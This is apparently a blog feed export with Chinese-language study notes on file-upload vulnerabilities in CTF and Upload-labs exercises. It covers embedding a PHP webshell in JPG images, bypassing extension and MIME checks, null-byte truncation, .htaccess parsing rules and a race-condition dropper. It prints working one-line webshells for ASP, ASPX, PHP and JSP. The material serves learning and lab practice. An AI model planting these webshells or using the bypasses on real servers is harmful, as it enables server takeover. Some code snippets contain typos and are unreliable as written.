搜索一下很多项目都有这个脚本，这里国光就随便搜索拿了搜索结果第一个的项目放在本文中。</p><p><strong>项目地址</strong>：<a href="https://github.com/BlackFan/jpg_payload">Github - lackFan/jpg_payload</a></p><p>准备一个 jpg 图片：</p><p><a href="https://image.3001.net/images/20201026/16036693924901.jpg"><img src="https://image.3001.net/images/20201026/16036693924901.jpg" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201026/1603669426842.jpg"><img src="https://image.3001.net/images/20201026/1603669426842.jpg" alt="img"></a></p><p>接着使用脚本来插入 payload，如果想要修改默认 payload 的话，自行修改脚本中的下部分代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>然后运行脚本插入 payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ php jpg_payload.php 122728342.jpg</span><br><span class="line">Success!</span><br></pre></td></tr></table></figure><p>生成的新图片为：</p><p><a href="https://image.3001.net/images/20201026/16036747206733.jpg"><img src="https://image.3001.net/images/20201026/16036747206733.jpg" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201026/1603674733221.jpg"><img src="https://image.3001.net/images/20201026/1603674733221.jpg" alt="img"></a></p><p>那么来查看一下最终这个 JPG 里面是否带有 payload 信息：</p><p><a href="https://image.3001.net/images/20201026/16036748931486.png"><img src="https://image.3001.net/images/20201026/16036748931486.png" alt="img"></a></p><p>无疑写 phpinfo () 是很容易成功的，但是 phpinfo () 并无实质性危害，我们需要插入真正的 webshell 才可以：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?php $_GET[0]($_POST[1]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>这里非常玄学，在国光经历了不知道多少次失败后，才成功将上面的 payload 完整插入</p></blockquote><p><a href="https://image.3001.net/images/20201026/1603675937154.jpg"><img src="https://image.3001.net/images/20201026/1603675937154.jpg" alt="img"></a></p><p>这个图马被 imagecreatefromjpeg 渲染后如下：</p><p><a href="https://image.3001.net/images/20201026/16036760334176.jpg"><img src="https://image.3001.net/images/20201026/16036760334176.jpg" alt="img"></a></p><p>查看一下 payload 是否存在：</p><p><a href="https://image.3001.net/images/20201026/16036761717904.png"><img src="https://image.3001.net/images/20201026/16036761717904.png" alt="img"></a></p><p>完美，尝试直接文件包含来执行攻击语句试试看：</p><p><a href="https://image.3001.net/images/20201026/16036764145479.png"><img src="https://image.3001.net/images/20201026/16036764145479.png" alt="img"></a></p><p><strong>JPG 坑点总结</strong></p><ol><li>需要被 imagecreatefromjpeg 渲染或再用工具</li><li>图片找的稍微大一点 成功率更高</li><li>Payload 语句越短成功率越高</li><li>一张图片不行就换一张 不要死磕</li><li>国光补充：貌似白色的图片成功率也比较高</li><li><code>&lt;?php $_GET[0]($_POST[1]);?&gt;</code> 这种 payload 成功率很高</li></ol><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>代码审计这一题如果可以动态调试的话，那么理解起来就会比较简单：</p><p><a href="https://image.3001.net/images/20201026/16036775446476.png"><img src="https://image.3001.net/images/20201026/16036775446476.png" alt="img"></a></p><p>这个题目是直接 copy Upload-labs 里面的最后一关，这个貌似还是后面新增的题目，下面是核心代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上最后一关和上传关系不大，这个题主要考查 PHP 代码审计，关于代码审计的题目实际上 XDebug 动态调试一下就可以很轻松的做出来，关于 XDebug 的配置文章可以参考国光我之前写的两篇文章：</p><ul><li><a href="https://www.sqlsec.com/2020/07/macphp.html">国光 - macOS 下优雅地配置 PHP 代码审计环境</a></li><li><a href="https://www.sqlsec.com/2020/09/xdebug.html">国光 - Xdebug + 宝塔 + PHPStudy+VScode PHP</a></li></ul><p>首先看第一个判断：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;black();&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以必须保证我们上传的表单 MIME 类型一定要符合标准。</p><p>接着对我们提交的 sava_name 的字符串进行处理，如果不是数组的话就以 <code>.</code> 为分隔，打散为数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">  <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果是<strong>数组的话就无需打散</strong>，这里比较关键，后面再详细说，先记着。</p><p>因为打散后会校验最后的后缀：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;black();&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不是合法后缀的话直接就报错了，所以我们老老实实的传入合法的字符串类型的不行的，这里的传入一个数组。比如这样的数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = [<span class="number">0</span>=&gt;<span class="string">&#x27;shell.php/&#x27;</span>, <span class="number">2</span>=&gt;<span class="string">&#x27;png&#x27;</span>]</span><br></pre></td></tr></table></figure><p>这样执行完最后的拼接文件名的代码后：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="string">&#x27;shell.php/&#x27;</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="number">2</span> - <span class="number">1</span>]; = <span class="string">&#x27;shell.php/&#x27;</span>.<span class="string">&#x27;&#x27;</span> = <span class="string">&#x27;shell.php/.&#x27;</span></span><br></pre></td></tr></table></figure><p>这样最后一步：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">PHPmove_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="string">&#x27;xx/xx/shell/php/.&#x27;</span>)  </span><br></pre></td></tr></table></figure><p>结合前面的 move_uploaded_file 函数缺陷，会忽略掉文件末尾的 <code>/.</code>，所以最终就可以成功将 webshell 上传。</p><p>那么最终构造的数据包如下：</p><p><img src="https://image.3001.net/images/20201026/16036832903333.png" alt="img"></p>]]></content>
    
    
    <summary type="html">认证技术的一部分。Web认证爆破 主要应用 BP 来爆破密码</summary>
    
    
    
    <category term="网络安全" scheme="http://chalnl.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="网络安全" scheme="http://chalnl.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="认证技术" scheme="http://chalnl.com/tags/%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/"/>
    
    <category term="密码爆破" scheme="http://chalnl.com/tags/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="http://chalnl.com/post/17553.html/"/>
    <id>http://chalnl.com/post/17553.html/</id>
    <published>2022-08-08T16:00:00.000Z</published>
    <updated>2022-10-01T10:01:19.507Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，比如<strong>企业的OA系统，允许用户上传图片、视频、头像和许多其他类D的文件</strong>。然而向用户提供的功能越多，Web应用受到攻击的风险就越大，如果Web应用存在文件上传漏洞，那么恶意用户就可以<strong>利用文件上传漏洞将可执行脚本程序(WebShell)上传到服务器中，获得网站的权限</strong>，然后可以<strong>进一步对服务器进行入侵</strong>，扩大控制权限。</p><h3 id="产生的原因"><a href="#产生的原因" class="headerlink" title="产生的原因"></a>产生的原因</h3><p>上传文件时，如果服务端代码没有对客户端上传的文件进行严格的验证和过滤，就容易造成可以<strong>上传任意文件</strong>的情况，包括上传脚本文件(asp、aspx、php、jsp等格式的文件)。</p><h3 id="漏洞的危害"><a href="#漏洞的危害" class="headerlink" title="漏洞的危害"></a>漏洞的危害</h3><p>非法用户可以利用<strong>上传的恶意脚本文件控制整个网站，甚至控制服务器</strong>。这个恶意的脚本文件，又被称为<strong>WebShell</strong>，也可将<strong>WebShell脚本称为一种网页后门</strong>, WebShell脚本具有非常强大的<strong>功能</strong>，比如<strong>查看服务器目录、服务器中的文件，执行系统命令</strong>等。<br>WebShell 就是以ASP、PHP、JSP等网页脚本存在的一种命令执行环节，通常也叫做<strong>网页后门</strong>。攻击者在<strong>入侵了一个网站后</strong>，通常<strong>会将WebShell上传到网站的根目录下或者插入到正常的网页中</strong>，然后<strong>使用浏览器或者对应的WebShell客户端来访问这些后门，将会得到一个命令执行的环境，以达到控制网站服务器的目的。</strong></p><h2 id="不同类型漏洞代码"><a href="#不同类型漏洞代码" class="headerlink" title="不同类型漏洞代码"></a>不同类型漏洞代码</h2><ul><li><p>ASP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request(&quot;x&quot;)%&gt;</span><br></pre></td></tr></table></figure></li><li><p>ASPX</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item [&quot;x&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure></li><li><p>PHP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])；<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>JSP CMD WebShell</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;x&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">java.io.InputStream in=Runtime,getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>)).getInp inta=-<span class="number">1</span>;</span><br><span class="line"><span class="type">byte</span>[]b=<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>((a=in.read(b))！=-<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">&#125;</span><br><span class="line">out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>)；</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="上传漏洞攻击满足的条件"><a href="#上传漏洞攻击满足的条件" class="headerlink" title="上传漏洞攻击满足的条件"></a>上传漏洞攻击满足的条件</h2></li></ul><ol><li>上传的文件<strong>能够被Web容器解释执行</strong>。所以文件上传后<strong>所在的目录要是Web容器所覆盖到的路径</strong>。</li><li>用户能够<strong>从 Web上访问这个文件</strong>。如果文件上传了，但用户无法通过Web访问，或者无法使得Web容器解释这个脚本，那么也不能称之为漏洞。</li><li>查看上传的文件是否被<strong>安全检查、格式化、图片压缩</strong>，改变了内容，则也可能导致攻击不成功。</li></ol><h2 id="中国蚁剑：antsword-使用的是POST接受参数，PHP木马使用的eval"><a href="#中国蚁剑：antsword-使用的是POST接受参数，PHP木马使用的eval" class="headerlink" title="中国蚁剑：antsword 使用的是POST接受参数，PHP木马使用的eval"></a>中国蚁剑：antsword 使用的是POST接受参数，PHP木马使用的eval</h2><h2 id="文件上传题目"><a href="#文件上传题目" class="headerlink" title="文件上传题目"></a>文件上传题目</h2><h3 id="1-JS-永远不要相信用户的输入"><a href="#1-JS-永远不要相信用户的输入" class="headerlink" title="1. JS - 永远不要相信用户的输入"></a>1. JS - 永远不要相信用户的输入</h3><p>“永远不要相信用户的输入”是进行安全设计和安全编码的重要准则。换句话说，任何输入数据在证明其无害之前，都是有害的。许多危险的漏洞就是因为过于相信用户的输入是善意的而导致的。</p><ol><li>禁用JS</li><li><strong>BP改包</strong></li><li>JS调试</li><li><p>使用 BP 修改返回包内容</p><h3 id="2-解析规则-Apache-中-htaccess"><a href="#2-解析规则-Apache-中-htaccess" class="headerlink" title="2.解析规则 - Apache 中 .htaccess"></a>2.解析规则 - Apache 中 .htaccess</h3><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现:网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p></li></ol><ul><li>White白名单：只允许某些类型的文件上传</li><li>Blacklist黑名单列表：不允许某些类型文件上传</li><li><strong>把png当做木马解析  然后就能解析到图</strong>片</li><li><strong>设置解析规则命令</strong><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat <span class="string">.htaccess</span></span><br><span class="line">AddType application/ x-httpd-php <span class="string">.png</span></span><br></pre></td></tr></table></figure><h3 id="3-MIME-媒体类型"><a href="#3-MIME-媒体类型" class="headerlink" title="3.MIME - 媒体类型"></a>3.MIME - 媒体类型</h3>媒体类型（通常称为MultipurposeInternetMalExtensions 或MNE类型）是一种标准，用来表示文档、文件或字节流的性质和格式。</li><li>MNE的组成结构非常简单﹔由类型与子类型两个字符串中间用′分隔而组成。不允许空格存在。type表示可以被分多个子类的独立类别。subtype表示细分后的每个类型。</li><li>通用结构:type/subtype</li><li><strong>方法：修改图片类型，或者修改后缀</strong></li></ul><h3 id="4-文件头-文件头绕过"><a href="#4-文件头-文件头绕过" class="headerlink" title="4.文件头 - 文件头绕过"></a>4.文件头 - 文件头绕过</h3><p>一个文件里面的内容到底是啥?用惯了Windows的人肯定是看后缀。但是后缀这个东西说改就改，不可靠。所以，最保险的还是把文件类型信息写到文件里面，通常来说，也就是写到文件开头的那几个字节。这是最方便，最快捷的用来辨别一个文件真实内容的方法。</p><div class="table-container"><table><thead><tr><th>文件名</th><th></th><th>文件头(16进制)</th></tr></thead><tbody><tr><td>JPEG</td><td>ipg</td><td>FFD8FF</td></tr><tr><td>PNG</td><td>png</td><td>89504E47</td></tr><tr><td>GIF</td><td>gif</td><td>47494638</td></tr><tr><td>HTML</td><td>html</td><td>68746D6C3E</td></tr><tr><td>ZIP Archive</td><td>zip</td><td>504B0304</td></tr><tr><td>RAR Archive</td><td>rar</td><td>52617221</td></tr><tr><td>Adobe Acrobat</td><td>pdf</td><td>255044462D312E</td></tr><tr><td>MS Word/Exce</td><td>xls.ordod</td><td>DOCF11E0</td></tr></tbody></table></div><ul><li><strong>方法：生成图片木马</strong></li><li><ol><li>png + php 合成png图马</li></ol></li><li>copy 1.png + 2.php/a 3.png</li><li><ol><li>将shell.php内容追加到pic.php<br>cat shell.php &gt;&gt; pic.png</li></ol></li><li><ol><li>直接echo追加<br>echo ‘&lt;?php phpinfo();?&gt;’ &gt;&gt; pic.png </li></ol></li></ul><h3 id="5-缺陷代码-1"><a href="#5-缺陷代码-1" class="headerlink" title="5.缺陷代码 - 1"></a>5.缺陷代码 - 1</h3><p>网络安全永远处于一个发展更新的状态。因为漏洞是依赖于产品的，产品更新换代，漏洞也会更新换代。而且安全，实际上它是一个博弈的过程，永远有更强的聪明小伙想要制造点新麻烦。如果要是想一劳永逸的话，这个行业可能并不适合。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>，<span class="string">&quot;php5&quot;</span>，<span class="string">&quot;php4&quot;</span>,“<span class="string">&quot;php3&quot;</span>，<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>，<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$blacklist</span>，<span class="string">&quot;&quot;</span>，<span class="variable">$nalie</span> ) ;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[ <span class="string">&#x27;file&#x27;</span>][ <span class="string">&#x27; tmp_name &#x27;</span> ]，UPLOAD_PATH . <span class="variable">$name</span> ))</span><br></pre></td></tr></table></figure><br><strong>题目会将名单中的格式替换为空 格式不区分大小写</strong></p><ul><li><strong>方法</strong>：shell.php - &gt; shell.pphphp</li></ul><h3 id="6-缺陷代码-2"><a href="#6-缺陷代码-2" class="headerlink" title="6.缺陷代码 - 2"></a>6.缺陷代码 - 2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>，<span class="string">&quot;php5&quot;</span>，<span class="string">&quot;php4&quot;</span>,“<span class="string">&quot;php3&quot;</span>，<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>，<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$blacklist</span>，<span class="string">&quot;&quot;</span>，<span class="variable">$nalie</span> ) ;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[ <span class="string">&#x27;file&#x27;</span>][ <span class="string">&#x27; tmp_name &#x27;</span> ]，UPLOAD_PATH . <span class="variable">$name</span> ))</span><br></pre></td></tr></table></figure><p><strong>题目会将名单中的格式替换为空格  格式区分大小写</strong></p><ul><li><strong>方法</strong> ：改变格式大小写</li></ul><h3 id="7-GET-型-00-截断"><a href="#7-GET-型-00-截断" class="headerlink" title="7.GET 型 00 截断"></a>7.GET 型 00 截断</h3><p>PHP内核是由C语言实现的，所以使用了C语言中的一些字符串处理函数。比如在连接字符串时候，0字节（\x00)将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串</p><ul><li>这种方法只适用于<br>magicquotes-gpc = Off<br>PHP版本小于5.3.4</li><li><strong>题目会将上传的文件重命名保存</strong></li><li><strong>方法</strong>：用BP截断后添加 X.png%00 进行截断上传</li></ul><h3 id="8-POST-型-00-截断"><a href="#8-POST-型-00-截断" class="headerlink" title="8.POST 型 00 截断"></a>8.POST 型 00 截断</h3><p>需要手动解码</p><ul><li><strong>方法</strong>：添加X.php%00后选中 %00 进行转码选择转成url</li><li>或者输入空格十六进制进制改为00</li></ul><h3 id="9-黑名单缺陷"><a href="#9-黑名单缺陷" class="headerlink" title="9.黑名单缺陷"></a>9.黑名单缺陷</h3><p>白名单是设置能通过的用户，白名单以外的用户都不能通过。黑名单是设置不能通过的用户，黑名单以外的用户都能通过。所以—般情况下白名单比黑名单限制的用户要更多—些</p><ul><li><strong>方法</strong>：BP拦截修改后缀名再放包</li></ul><h3 id="10-条件竞争"><a href="#10-条件竞争" class="headerlink" title="10.条件竞争."></a>10.条件竞争.</h3><p><strong>事件的先后顺序不会影响一个系统的运行结</strong>果。当这些不受控制的事件并<strong>没有按照开发者想要的方式运行</strong>时，就可能会出现bug。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件<strong>竞争漏洞</strong>。<br>攻击者上传了一个用来生成恶意shell的文件，在上传完成和安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意shell的文件。至此，该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把它删除的问题都已经不重要了，因为攻击者已经成功的在服务器中植入了一个shell 文件，后续的一切就都不是问题了。<br>不过竞争的马因为生存周期短的原因，所以和普通的webshell不太一样，他的使命是在有限的生命中等待一个有缘人的光顾，然后快速生成一个小Webshell，落红不是无情物，化作春泥更护花（泪目）。这类的webshell内容大体上如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;xiao.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>不允许直接上传</li><li>先上传再判断然后操作</li><li>CPU - &gt; 时间差</li><li>条件竞争 - &gt; 短时间内多线程大量请求(上传)</li><li><strong>母马-&gt;解析-&gt;释放子马</strong></li><li><ol><li>挑选天选之马(木马)  访问时会将母马写入xaio.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;xiao.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php 